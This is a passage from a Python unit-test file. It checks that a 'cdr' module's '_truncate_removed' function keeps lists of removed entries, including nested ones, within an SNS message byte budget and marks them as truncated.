        assert serialised <= cdr._SNS_REMOVED_BYTE_BUDGET
        assert "truncated" in result["removed"][-1]
        assert len(result["removed"]) < 50

    def test_nested_large_entry_names_bounded_by_bytes(self):
        big = "B" * 20_000
        report = {"report": {"removed": [f"{big}{i}" for i in range(50)]}}
        result = cdr._truncate_removed(report)
        serialised = len(__import__("json").dumps(result["report"]["removed"]))
        assert serialised <= cdr._SNS_REMOVED_BYTE_BUDGET
        assert "truncated" in result["report"]["removed"][-1]
